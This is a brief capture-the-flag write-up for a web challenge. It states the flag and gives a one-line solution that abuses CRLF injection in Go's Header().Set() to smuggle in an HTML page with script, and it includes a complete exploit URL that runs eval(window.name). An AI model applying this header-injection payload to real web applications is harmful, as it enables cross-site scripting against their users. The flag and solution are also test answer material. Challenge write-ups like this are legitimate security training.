# Notepad 1.5 - Arthur's Article

### Challenge Description

  ??????

### Challenge File
[Source](./Handout/arthursarticle.zip)

### MD5 Hash: 
`fc10f1d03e258b1e697a826541e5b2a1`


### Short Writeup

* Exploit CRLF in go's Header().Set() library to inject arbitrary html using the header name. 

* `http://chall.notepad15.gq/find?startsWith=asd&debug=2&A:asd%0AContent-Type:text/html%0A%0A%3Chtml%3E%3Cscript%3Eeval(window.name)%3C/script%3E`


### Author
[Az3z3l](https://twitter.com/Az3z3l)

### Flag
`inctf{red_dead_rezoday_ialmvwoawpwe}`